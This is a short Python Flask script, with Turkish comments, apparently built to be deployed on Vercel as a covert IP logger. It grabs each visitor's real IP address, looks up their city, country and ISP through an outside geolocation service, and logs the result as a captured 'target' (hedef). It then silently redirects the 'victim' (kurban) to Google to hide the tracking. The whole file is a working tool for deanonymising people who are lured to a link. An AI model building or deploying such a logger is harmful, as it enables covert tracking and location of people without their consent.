from flask import Flask, request, redirect
import requests

app = Flask(__name__)

@app.route('/')
def logger():
    # Vercel gerçek IP'yi 'x-forwarded-for' başlığında taşır
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # IP Sorgusu (OSINT)
        r = requests.get(f"http://ip-api.com/json/{ip}")
        d = r.json()
        info = f"{d.get('city')}, {d.get('country')} | {d.get('isp')}"
    except:
        info = "Sorgu Hatasi"

    # Logları terminale bas (Vercel Dashboard'da 'Logs' kısmında göreceksin)
    print(f"\n[!] HEDEF YAKALANDI: {ip}\n[!] DETAY: {info}\n")
    
    # Kurbanı yönlendir
    return redirect("https://www.google.com")

# Vercel için gerekli
def handler(event, context):
    return app(event, context)
  
